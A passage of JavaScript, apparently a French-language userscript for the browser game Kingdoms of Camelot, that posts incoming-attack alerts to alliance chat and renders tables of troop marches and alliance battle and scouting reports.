   	  if (Cities.byID[f.id].c.defending!=0)
   	   a+=" (JE DEFENDS) ";
   	  else
   	   a+=" (SANCTUAIRE) ";
    }
     var b=Cities.byID[f.id].c.marches.incoming[c.id];
     var attaquant=unsafeWindow.GOR.players[c.from.playerId]?unsafeWindow.GOR.players[c.from.playerId].name:"?";

     
     
     var arrivalTime = b.secondsToDestination()>0?timestr(b.secondsToDestination()):message;
     var msg ='';
     msg += b.general.level?" Niv General : "+b.general.level:"";
     msg +=' *** ARRIVEE *** ';
     unsafeWindow.Object.keys(b.units).each(function(h){
     if(b.units[h].sent>0) {
		   	   msg += b.units[h].sent + ' ' + unsafeWindow.arStrings.unitName["u"+h] + ', ';
		         }
 		});
     		
     msg = msg.slice(0, -2);
     
     msg += "  (arrive dans " + arrivalTime + "). " ;
           
      
    var mess = Options.alertConfig.aPrefix  +" Cible : " + a +" Assaillant : " + " " +attaquant + " "+e+" " + msg;

    var lancement=0;
    
    sendChat("/a " + mess);

  }		
 }
 
     
 /************* MARCHES ***************/
 my.marches = {
  cont:null,
  state : null,
  displayTimer:null,
  getContent : function (){
      var t = my.marches;
      return t.cont;
    },
    
    init : function (){
      var t = my.marches;
      t.cont = document.createElement('div');
      return this.cont;
    },
    show : function () {
     var t = my.marches;
     clearTimeout (t.displayTimer);
     if (t.state == null){
           t.cont.innerHTML = '<DIV id=marchesContent style="height:630px; max-height:630px; overflow-y:auto"></div>';
           t.state = 1;
     }
     var  m = '<DIV class=ptstat>ATTAQUE(S) ENTRANTES</div>';
     
     var ma ="";
     var roww=0;
     unsafeWindow.player.allCities().sortBy(function(c){return c.number}).each(function(f,c){
             var d="",e="";
             if(f.underAttack()) {
             
                Cities.byID[f.id].c.incomingAttackMarches().each(function(c){
                var b=Cities.byID[f.id].c.marches.incoming[c.id];
                var arrivalTime = b.secondsToDestination()>0?b.secondsToDestination():0;
        	   
                if ((arrivalTime>0)) 
                {
                 roww++;
                 couleur="";
                 if (roww%2) couleur=" style='background:#e8e8e8'";
                 var arrivalTime = b.secondsToDestination()>0?timestr(b.secondsToDestination()):"Inconnu";
     		 var attaquant=unsafeWindow.GOR.players[c.from.playerId]?unsafeWindow.GOR.players[c.from.playerId].name:"?";
     		 if(Cities.byID[f.id].c.wilds[c.to.tileId]){
		    	  var a='TS ' + unsafeWindow.Watchtower.generateCoords(c.to.cityId,c.to.tileId)
		 } else{
		    	  var a='Ville ' + unsafeWindow.player.cities[c.to.cityId].name + ' ('+unsafeWindow.player.cities[c.to.cityId].x +','+ unsafeWindow.player.cities[c.to.cityId].y +')';
  		 }
                 ma += "<tr><td "+couleur+">" + a + "</td><td "+couleur+">" +  arrivalTime +"</td>";
                 var e="";
		 if(c.from.allianceId>0&&Seed.allianceNames&&Seed.allianceNames["a"+b.from.allianceId]){
		           e="" + Seed.allianceNames["a"+b.from.allianceId] +"";
		          }else{
		           if(c.from.allianceName!==null){e="" + c.from.allianceName+"";}
    		 }
                 ma += "<td "+couleur+">" + attaquant + "</td><td "+couleur+">"+e+"</td>";
                 
                 ma +="<td "+couleur+">" +(b.general.level?" Niv "+b.general.level:" Inconnu ") + "</td>";
                 
                 var unt="";
                 unsafeWindow.Object.keys(b.units).each(function(h){
		      if(b.units[h].sent>0) {
		 		   	   unt += b.units[h].sent + ' ' + unsafeWindow.arStrings.unitName["u"+h] + '<br>';
		 		         }
		  		});
		      		
    		 unt = unt.slice(0, -2);
                 ma +="<td "+couleur+">" + unt + "</td>";
                 
                 ma +="</tr>";
               }
               });
             
             }
        });
        
     if (ma!="") {
      m += "<table class='marches' width=100% cellspacing=0 bordercolor=black cellpadding=4><tr style='height:30px'><td><b>Lieu Attaque</td><td><b>Temps</td><td><b>Attaquant</td><td><b>Alliance</td><td><b>General</td><td><b>Troupes</td><tr>";
      m += ma;
      m += "</table>";
     }
     
     m+= '<br><DIV style="height:620px; max-height:620px; overflow-y:auto"><DIV class=ptstat>MARCHES SORTANTES</div>';
     
     var roww=0;
     var ms="";
     unsafeWindow.player.allCities().sortBy(function(c){return c.number}).each(function(f,c){
        
     var a=unsafeWindow.Object.values(Cities.byID[f.id].c.marches.outgoing).compact();
     a=a.concat(unsafeWindow.Object.values(Cities.byID[f.id].c.marches.bgReinforcements).compact());
     a.each(function(d){
     var g="",e='<a onclick="KB.Controllers.MapHelper.gotoCoord('+d.to.x +','+ d.to.y +');">('+d.to.x+','+ d.to.y +')</a>';
        roww++;
        couleur=""
        if (roww%2) couleur=" style='background:#e8e8e8'";
        var now = unixTime();
        var arrivalTime = d.secondsToDestination()>0?timestr(d.secondsToDestination()):d.secondsToReturn()>0?timestr(d.secondsToReturn()):"Inconnu";
        ms+="<tr>"
        
    
         ms+="<td></td>";
   
        ms+="<td "+couleur+">" + Cities.byID[f.id].c.name + "</td><td "+couleur+">"+arrivalTime+"</td><td "+couleur+">"+d.typeString()+"</td><td "+couleur+">"+d.statusString()+"</td><td "+couleur+">"+e+"</td>";
        
        
        gen=Cities.byID[f.id].c.generals[d.general.id];
        if (gen!=undefined) {
         ms+="<td "+couleur+">"+gen.name +" ("+gen.level()+")</td>"
        }else {
         ms+="<td "+couleur+">??</td>";
        }
        
        ms+="<td "+couleur+">";
        
        unsafeWindow.Barracks.allUnitIds.each(function(j){
        
         var i=(d.returning()||d.defending())?d.units[j].returning:d.units[j].sent;
         if (i>0)
          ms +=addCommas(i)+ " "+ unsafeWindow.arStrings.unitName["u"+j] +"<br>";
         
        });
        
        ms+="</td>";
        ms+="</tr>";

     });
        
     });
     if (ms!="") {
     
       m += "<table class='marches' width=100% cellspacing=0 bordercolor=black cellpadding=4><tr style='height:30px'><td></td><td><b>Ville</td><td><b>Temps</td><td><b>Type</td><td><b>Status</td><td><b>Lieu</td><td><b>General</td><td><b>Troupes</td></tr>";
           m += ms;
           m += "</table>";
 
     
     }
     
     document.getElementById('marchesContent').innerHTML = m;
     t.displayTimer=setTimeout(t.show, 2000);
    },
    hide : function (){
     var t = my.marches;
     clearTimeout (t.displayTimer);
    },
 }; 
 
 /************* RAPPORTS **************/
 my.Hud = {
   cont:null,
   state : null,
   popReport :null,
   minPages:		parseInt(Options.arPageFrom),
   maxPages:		parseInt(Options.arPageTo),
   totalPages:	parseInt(Options.arPageTo),
       data:[],
   getContent : function (){
     var t = my.Hud;
     return t.cont;
   },
   
   init : function (){
     var t = my.Hud;
     t.cont = document.createElement('div');
     return this.cont;
   },
   
   show : function () {
     var t = my.Hud;
     t.minPages=parseInt(Options.arPageFrom);
     t.maxPages=parseInt(Options.arPageTo);
       t.getAllianceReports();
       unsafeWindow.getReport = t.getReportBody;
       t.cont.innerHTML = '\
           <DIV class=ptstat>Recherche des attaques dans les rapports d\'alliance.</div>\
           <DIV class=ptentry style="height:30px"><table>\
           <tr><td class=xtab> Pages :&nbsp;<INPUT id="idRptPageFrom" size=1 value="' + t.minPages + '">&#8211;<INPUT id="idRptPageTo" size=1 value="' + t.maxPages + '"> \
           <span id=idSpanNumPages></span>\
           </td>\
           <TD class=xtab><INPUT id="idHudSearch" type=submit value="OK" />\
           <span id=idSpanHudErrorMsg></span><td><select id="idHudTypeSearch"><option value="">Tous les rapports</option><option value="0">Attaques entrantes</option><option value="1">Attaques sortantes</option><option value="2">Renforts</option></select>\
           <select id="idHudMedSearch"><option value="">Tous</option><option value=1>Voir que mes rapports</option></select></td></tr>\
           </table></div>\
           <DIV id="hudResultsDiv" style="height:620px; max-height:620px; overflow-y:auto;"></div>';
           document.getElementById('idHudSearch').addEventListener ('click', t.handleHudSearch, false);
           document.getElementById('idHudMedSearch').addEventListener ('click', t.DisplayReports, false);
           document.getElementById('idHudTypeSearch').addEventListener ('click', t.DisplayReports, false);
           document.getElementById('idRptPageFrom').addEventListener ('change', t.handleRptPages, false);
	   document.getElementById('idRptPageTo').addEventListener ('change', t.handleRptPages, false);
         /* setTimeout(function() {
            t.handleHudSearch();
          }, 1000);*/
  },
    getReportBody : function(Date1,ID,TileId,SideNum, Nom1, Coord1, Nom2, Coord2){
        var t = my.Hud;
        if(SideNum=="Ent") SideNum=0;
        if(SideNum=="Sor") SideNum=1;
        if(SideNum=="Ren") SideNum=0;
        var c = {};
        c.rid=ID;
        c.side=SideNum;
        
        if (SideNum=="Ren") SideNum = 2;
        
        unsafeWindow.AjaxCall.gPostRequest("fetchReport.php",c,
	        function(rslt){
	           t.showReportBody(Date1, rslt.data,TileId,SideNum,Nom1, Coord1, Nom2, Coord2);     
	        },
	        function (rslt) {
	               
	        }
       );
    },
    handleRptPages: function(){
    		var t = my.Hud;
    		t.minPages=parseInt(document.getElementById("idRptPageFrom").value);
    		t.maxPages=parseInt(document.getElementById("idRptPageTo").value);
    		if (t.maxPages < t.minPages) {
    			t.maxPages = t.minPages;
    			document.getElementById("idRptPageTo").value = t.maxPages;
    		}
    		Options.arPageFrom = t.minPages;
    		Options.arPageTo = t.maxPages;
    		saveOptions();
    		t.totalPages=t.maxPages;
     },
    showReportBody: function (Date1,rslt,TileId,SideNum,Nom1,Coord1,Nom2,Coord2) {
      	var t = my.Hud;
      	if (t.popReport == null) {
      	 t.popReport = new CPopup('pbShowBarbs', 0, 0, 520, 520, true, function() {clearTimeout (1000);});
       	 t.popReport.centerMe (mainPop.getMainDiv());  
      	}
       	var m = ''; 
      	m+='<TABLE class=ptTab cellpadding=3>';
     
      	if (SideNum==0) {
      	 // Seulement les attaques entrantes
      	
      	if (TileId < 51 && rslt['tileLevel']!=undefined) m+='<TD><FONT size="4px">Terre Sauvage Niv '+rslt['tileLevel']+'</font></td>';
      	if (TileId < 51 && rslt['tileLevel']==undefined) m+='<TD><FONT size="4px">Terre Sauvage</font></td>';
      	if (rslt['conquered']==1) m+='<TD><FONT color="#CC0000" size="4px">Conquis</font></td></tr>';
    
      	if (rslt['winner']==1) m+='<TR><TD><FONT color="#CC0000" size="4px"><b>D&eacute;faite</b><br></font></td></tr></table>';
      	if (rslt['winner']==0) m+='<TR><TD><FONT color="green" size="4px"><b>Victoire</b><br></font></td></tr></table>';
    	
    	if (rslt['fght'] != undefined){
    			m+='<TABLE style="float:left;width:45%;" class=ptTab><tr><td colspan=3><b>Attaquant : '+Nom1+' <a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ Coord1 +');" class="coordinateLink">('+ Coord1 +')</a></b><br>Chevalier : '+ rslt['s1KCombatLv'] +'<br>Nombre de tour(s) : '+rslt['rnds']+'<br>Bonus : '+ parseInt(rslt['s1atkBoost']*100)  +' % attaque - '+ parseInt(rslt['s1defBoost']*100) +' % d&eacute;fence</td></tr>\
    			    <TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Battu</td><TD align="center">A surv&eacute;cu</td></tr>'; 
    			if (rslt['fght']["s1"] != undefined) {
    					for (var i=1;i<32;i++) {
    						if (rslt['fght']["s1"]['u'+i] != undefined) {
    							if (rslt['fght']["s1"]['u'+i][0] > rslt['fght']["s1"]['u'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s1"]['u'+i][0]+'</td><TD align="center"><FONT color="#CC0000">'+rslt['fght']["s1"]['u'+i][1]+'</font></td></tr>';
    							else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></div></td><TD align="center">'+rslt['fght']["s1"]['u'+i][0]+'</td><TD align="center">'+rslt['fght']["s1"]['u'+i][1]+'</td></tr>';
    						}
    					}
    			}
    			m+='</table><TABLE style="float:right;width:45%;" class=ptTab><tr><td colspan=3><b>D&eacute;fenseur : '+Nom2+' <a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ Coord2 +');" class="coordinateLink">('+ Coord2 +')</a></b><br>Chevalier : '+ rslt['s0KCombatLv'] +'<br><br>Bonus : '+ parseInt(rslt['s0atkBoost']*100)  +' % attaque - '+ parseInt(rslt['s0defBoost']*100) +' % d&eacute;fence</td></tr>';	  			  	
    		  	if (rslt['fght']["s0"] != undefined) {
    				  	m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Battu</td><TD align="center">A surv&eacute;cu</td></tr>';
    				  	for (var i=60;i<=63;i++) {
    				  		if (rslt['fght']["s0"]['f'+i] != undefined) {
    				  			if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center"><FONT color="#CC0000">'+rslt['fght']["s0"]['f'+i][1]+'</font></td></tr>';
    				  			else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center">'+rslt['fght']["s0"]['f'+i][1]+'</td></tr>';
    				  		}
    				  	}
    				  	
    				  	for (var i=1;i<32;i++) {
    				  		if (rslt['fght']["s0"]['u'+i] != undefined) {
    				  			if (rslt['fght']["s0"]['u'+i][0] > rslt['fght']["s0"]['u'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['u'+i][0]+'</td><TD align="center"><FONT color="#CC0000">'+rslt['fght']["s0"]['u'+i][1]+'</font></td></tr>';
    				  			else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['u'+i][0]+'</td><TD align="center">'+rslt['fght']["s0"]['u'+i][1]+'</td></tr>';
    				  		}
    				  	}
    				  	for (var i=50;i<=55;i++) {
  					 if (rslt['fght']["s0"]['f'+i] != undefined) {
  					  if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center"><FONT color="#CC0000">'+rslt['fght']["s0"]['f'+i][1]+'</font></td></tr>';
  					   			else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center">'+rslt['fght']["s0"]['f'+i][1]+'</td></tr>';
  					  }
    				  	}
    		     } else {
  				  		  	 m+="<tr><td><br>Aucune unit&eacute; d&eacutefendue</td></tr>";
  	  		 }
    		  	m+='<TR><TD></TD></TR></table>';
    	}
      	
      	if (rslt['unts']!= undefined) { // pour les renforts :) lol ca sert pas pour le moment
      	    // Renfort !
    	   m+='<TABLE style="float:right;width:45%;" class=ptTab><TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Renforc&eacute;</td></tr>';
  
  	   for (var i=1;i<=31;i++) {
  	     		  		if (rslt['unts']['u'+i] != undefined) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['unts']['u'+i]+'</td></tr>';
      	   }
   
    	   m+="</table>"; 
    	
      	}
      	m+='<TR><TD></TD></TR><TR><TD></TD></TR></table>';
      	
      	if (rslt['loot'] != undefined) {
    		  	m+='<TABLE class=ptTab cellpadding=3><tr><td colspan=4><b><u>Ressources :</u></b><br>\
		        </tr><TR><TD>Argent : </td><TD><FONT color="#CC0000">'+addCommas(parseInt(rslt['loot'][0]))+'</td>';
    		  	m+='<TD>Nourriture : </td><TD><FONT color="#CC0000">'+addCommas(parseInt(rslt['loot'][1]))+'</td>';
    		  	m+='<TD>Bois : </td><TD><FONT color="#CC0000">'+addCommas(parseInt(rslt['loot'][2]))+'</td>';
    		  	m+='<TD>Pierre : </td><TD><FONT color="#CC0000">'+addCommas(parseInt(rslt['loot'][3]))+'</td>';
    		  	m+='<TD>Fer : </td><TD><FONT color="#CC0000">'+addCommas(parseInt(rslt['loot'][4]))+'</td></table>';
    	}	
    	
    	
    	if (rslt['rsc'] != undefined) {
    		  	m+='<TABLE class=ptTab cellpadding=3><tr><td colspan=4><b><u>Ressources :</u></b><br></tr><TR>'
    		  	if (rslt['gld']!= undefined) m+='<TD>Argent : </td><TD>'+addCommas(parseInt(rslt['gld']))+'</td>';
    		  	m+='<TD>Nourriture : </td><TD>'+addCommas(parseInt(rslt['rsc']['r1']))+'</td>';
    		  	m+='<TD>Bois : </td><TD>'+addCommas(parseInt(rslt['rsc']['r2']))+'</td>';
    		  	m+='<TD>Pierre : </td><TD>'+addCommas(parseInt(rslt['rsc']['r3']))+'</td>';
    		  	m+='<TD>Fer : </td><TD>'+addCommas(parseInt(rslt['rsc']['r4']))+'</td></table>';
    	}	
    	
    	} else if ( SideNum == "2") {
  
    	  // Renfort !
     	   m+='<TABLE style="float:left;width:45%;" class=ptTab><TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Renforc&eacute;</td></tr>';
   
   	   for (var i=1;i<=12;i++) {
   	     		  		if (rslt['unts']['u'+i] != undefined) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['unts']['u'+i]+'</td></tr>';
       	   }
    
    	   m+="</table>"; 
    	} else {
    	
    	 m+='<table border=0 bgcolor=white width=100% cellpadding=3><tr><td colspan=2 style="background-color:white;"><table>';
    	 // attaquantes sortantes
    	 if (TileId < 51 && rslt['tileLevel']!=undefined) m+='<TD><FONT size="3px">Terre Sauvage Niv '+rslt['tileLevel']+'</font></td>';
  	 if (TileId < 51 && rslt['tileLevel']==undefined) m+='<TD><FONT size="3px">Terre Sauvage</font></td>';
  	 if (TileId == 51 &&  Nom2==undefined)  m+='<TD><FONT size="3px">Camps Barbares</font></td>';
  	 if (rslt['conquered']==1) m+='<TD><FONT color="#CC0000" size="3px">Conquis</font></td></tr>';
  	   
  	     if (rslt['winner']==0) m+='<TR><TD style="background-color:white;"><FONT color="#CC0000" size="3px"><b>D&eacute;faite<br><br></font>';
  	     if (rslt['winner']==1 || rslt['winner']==2) m+='<TR><TD style="background-color:white;"><FONT color="green" size="3px"><b>Victoire<br><br></font>';
             m+="</table>";
               
  	  		m+='<TABLE style="float:left;width:45%;" class=ptTab><tr><td colspan=3><b>Attaquant : '+Nom1+' <a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ Coord1 +')" class="coordinateLink">('+ Coord1 +')</a></b>';
  	  		if (rslt['s1KCombatLv']!=undefined) m+='<br>Chevalier : '+ rslt['s1KCombatLv'] +'';
  	  		if (rslt['rnds']!=undefined) m+='<br>Nombre de tour(s) : '+rslt['rnds']+'<br>';
  	  		if (rslt['s1atkBoost']!=undefined || rslt['s1defBoost']!=undefined) m+='Bonus : '+ parseInt(rslt['s1atkBoost']*100)  +' % attaque - '+ parseInt(rslt['s1defBoost']*100) +' % d&eacute;fence';
  	  		m+='</td></tr>';
  	  		if (rslt['fght'] != undefined){
  	  			m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Battu</td><TD align="center">A surv&eacute;cu</td></tr>'; 
  	  			if (rslt['fght']["s1"] != undefined) {
  	  					for (var i=1;i<32;i++) {
  	  						if (rslt['fght']["s1"]['u'+i] != undefined) {
  	  							if (rslt['fght']["s1"]['u'+i][0] > rslt['fght']["s1"]['u'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['fght']["s1"]['u'+i][0])+'</td><TD align="center"><FONT color="#CC0000">'+addCommas(rslt['fght']["s1"]['u'+i][1])+'</font></td></tr>';
  	  							else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['fght']["s1"]['u'+i][0])+'</td><TD align="center">'+addCommas(rslt['fght']["s1"]['u'+i][1])+'</td></tr>';
  	  						}
  	  					}
  	  					
  	  			}
  	  		}
  	  		if (Nom2==undefined) Nom2="barbare";
  	  		m+='</table><TABLE style="float:right;width:45%;" class=ptTab><tr><td colspan=3><b>D&eacute;fenseur : '+Nom2+' <a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ Coord2 +');" class="coordinateLink">('+ Coord2 +')</a></b>';
  	  		if (rslt['s0KCombatLv']!=undefined) m+='<br>Chevalier : '+ rslt['s0KCombatLv'];
  	  		if (rslt['lstlgn'] != undefined)
  	  			{
  	  			 m+="<br>Derni&egrave;re connexion : " + unsafeWindow.formatDateByUnixTime(rslt['lstlgn'])+"<br>";
  	  			} else {
  	  			 m+="<br>";
  	  			}
  	  			if (rslt['s0atkBoost']!=undefined || rslt['s0defBoost']!=undefined) {
  	  			 m+='Bonus : '+ parseInt(rslt['s0atkBoost']*100)  +' % attaque - '+ parseInt(rslt['s0defBoost']*100) +' % d&eacute;fence';
  	  			}
  	  			m+='</td></tr>';
  	  		if (rslt['fght'] != undefined){
  	  		  	if (rslt['fght']["s0"] != undefined) {
  	  				  	m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Battu</td><TD align="center">A surv&eacute;cu</td></tr>';
  	  				 	for (var i=60;i<=63;i++) {
  							if (rslt['fght']["s0"]['f'+i] != undefined) {
  							if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center"><FONT color="#CC0000">'+rslt['fght']["s0"]['f'+i][1]+'</font></td></tr>';
  							else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center">'+rslt['fght']["s0"]['f'+i][1]+'</td></tr>';
  							}
  						 }
  	  				  	for (var i=1;i<32;i++) {
  	  				  		if (rslt['fght']["s0"]['u'+i] != undefined) {
  	  				  			if (rslt['fght']["s0"]['u'+i][0] > rslt['fght']["s0"]['u'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['fght']["s0"]['u'+i][0])+'</td><TD align="center"><FONT color="#CC0000">'+addCommas(rslt['fght']["s0"]['u'+i][1])+'</font></td></tr>';
  	  				  			else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['fght']["s0"]['u'+i][0])+'</td><TD align="center">'+addCommas(rslt['fght']["s0"]['u'+i][1])+'</td></tr>';
  	  				  		}
  	  				  	}
  	  				  	
  						for (var i=50;i<=55;i++) {
  							 if (rslt['fght']["s0"]['f'+i] != undefined) {
  							  if (rslt['fght']["s0"]['f'+i][0] > rslt['fght']["s0"]['f'+i][1]) m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center"><FONT color="#CC0000">'+rslt['fght']["s0"]['f'+i][1]+'</font></td></tr>';
  				   			  else m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+rslt['fght']["s0"]['f'+i][0]+'</td><TD align="center">'+rslt['fght']["s0"]['f'+i][1]+'</td></tr>';
  						}
    				  	}
  	  				  	
  	  			}	  	
  	  				  	
  	  		  	 if ((rslt['unts']!=undefined) || (rslt['frt']!=undefined)) {
  	  		  	    if (rslt['frt']!=undefined) {
  	  		  	       m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">D&eacute;fenses</td><TD align="center">Compte</td></tr>';
  				   
  				   	for (var i=60;i<=63;i++) {
  				     	  if (rslt['frt']['f'+i] != undefined) {
  				     	     m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['frt']['f'+i])+'</td></tr>';
  				     	  }
    				  	}
  				      for (var i=50;i<=55;i++) {
  				   	 if (rslt['frt']['f'+i] != undefined) {
  				           m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['frt']['f'+i])+'</td></tr>';
  				   	 }
  				      }
  				    }
  				    if (rslt['frt']!=undefined) {
  	  			      m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Compte</td></tr>';
  				      for (var i=1;i<32;i++) {
  					 if (rslt['unts']['u'+i] != undefined) {
  					    m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['unts']['u'+i])+'</td></tr>';
  					  }
  	  			       }
  	  			    }
  	  			  
  	  			} else {
  	  		  	 m+="<tr><td><br>Aucune unit&eacute; d&eacutefendue</td></tr>";
  	  		  	}
  	  		  	m+='<TR><TD></TD></TR></table>';
    	        }
   	        m+="</td></tr><tr><td><br></tr>";
   	        
  	  	if (rslt['pop'] != undefined) {
  	  	
  	  	   m += '</table><tr><td style="background-color:white;"><b><u>Reconnaissance</u></b><br><br>';
  	  	
  	  	
  	  	   m+='<table style="float:left;width:45%;"class=ptTab cellpadding=3>';
  	  	   
  	  	   	  	   
  	  	    	  	  if ((rslt['unts']!=undefined) || (rslt['frt']!=undefined)) {
		    	  		  	    if (rslt['frt']!=undefined) {
		    	  		  	       m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">D&eacute;fenses</td><TD align="center">Compte</td></tr>';
		    				   
		    				   	for (var i=60;i<=63;i++) {
		    				     	  if (rslt['frt']['frt'+i] != undefined) {
		    				     	  if (parseInt(rslt['frt']['frt'+i]) >0)
		    				     	     m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['frt']['frt'+i])+'</td></tr>';
		    				     	  }
		      				  	}
		    				      for (var i=50;i<=55;i++) {
		    				   	 if (rslt['frt']['frt'+i] != undefined) {
		    				   	  if (parseInt(rslt['frt']['frt'+i]) >0)
		    				           m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['frt']['frt'+i])+'</td></tr>';
		    				   	 }
		    				      }
		    				    }
		    				    if (rslt['unts']!=undefined) {
		    	  			      m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Troupes</td><TD align="center">Compte</td></tr>';
		    				      for (var i=1;i<=31;i++) {
		    					 if (rslt['unts']['u'+i] != undefined) {
		    					  if (parseInt(rslt['unts']['u'+i]) >0)
		    					    m+='<TR><TD align="center"><div  class="pic px30 units unit_'+i+'"></td><TD align="center">'+addCommas(rslt['unts']['u'+i])+'</td></tr>';
		    					  }
		    	  			       }
		    	  			    }
		    	  			  
  	  			}
  	  	 
  	  	 }
  	  	 m+='</table><table style="float:right;width:45%;"class=ptTab cellpadding=3>';
  	  	 if (rslt['pop'] != undefined  || rslt['knght'] != undefined ||rslt['hap'] != undefined) {
  	  	       m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><td align="center">Ville<td align="center">&nbsp;</tr>';
		   	  	   if (rslt['pop'] != undefined) {
		   	  	    m+='<TR><TD>Population</TD><TD>'+addCommas(parseInt(rslt['pop']))+'</td></tr>';
		   	  	   }
		   	  	   if (rslt['hap'] != undefined) {
		   	  	    m+='<tr><td>Bonheur<td>'+rslt['hap'] +'</td><tr>';
		   	  	   }
		   	  	   if (rslt['knght'] != undefined) {
		   	  	    m+='<tr><td>Chevalier<td>'+rslt['knght']['cbt']+'</td></tr><tr><td>&nbsp;</tr>';
  	  	    }
  	  	  } 
  	  	   if (rslt['blds'] != undefined) {
  	  	     m+='<TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><td align="center">Batiment<td align="center">Nombre</tr>';
  	  		   	     		 
		   		  for (var i=1; i<100; i++){
		   		    if (rslt['blds']['b'+i] != undefined) {
		   					
		   	     			var blds = rslt['blds']['b'+i]; 
		   	     			//var couleur='';
		   	     			//if (bType==8) couleur=' style="background-color:red"';
		   	     			m += '<TR><TD>'; 
		   	     			arField = [], firstbld = true;
		   	     			m += unsafeWindow.arStrings.buildingName["b"+i] +'</TD><TD>';
		   	     			for (var zz=1; zz<12; zz++)
		   	     				arField[zz]=0;
		   	     			for (var zz=0; zz < blds.length; zz++)
		   	     				arField[blds[zz]]++
		   	     			for (var zz=11; zz>0; zz--) {
		   	     				if (arField[zz] > 0) {
		   	     					if (firstbld)
		   	     						firstbld = false;
		   	     					else
		   	     						m+=', ';
		   	     					if (arField[zz] > 1)
		   	     						m+=arField[zz] + ' x ';
		   	     					m+=' ' + zz;
		   	     				}
		   	     			}
		   	     			m+='</TD></TR>';
		   	     	     }
		   	     	    }
		   	     
		   	     	  
		   	
		
  	  	   
  	  	   
  	  	   
  	  	   }

  	  	  m+='</table>';
  	  
    	        if (rslt['tch'] != undefined) {
    	        
    	           m+='<table style="float:left;width:45%;" class=ptTab><TR style="background-color:#E5DDC9;color: #422714;font-size: 12px;font-weight: bold;"><TD align="center">Tech</td><TD align="center">Niveau</td></tr>';
  	  				
    	           for (var i=1;i<=16;i++) {
    	           
    	            if (rslt['tch']['t'+i]!=undefined) {
    	             m+='<tr><TD>' + unsafeWindow.arStrings.techName['t'+i] + '</td><TD>'+rslt['tch']['t'+i]+'</td></tr>';
    	            }
  	  		       
    	           }
    	           
    	         
    	           
    	           m+='</table>';
  	     }
            
  	     var typebutin ='';
  	    	
  	     	if (rslt['loot'] != undefined) {
  	     		m+='</td><tr><td style="background-color:white;"><b><u>Ressources '+typebutin+' :</u></b><br>';
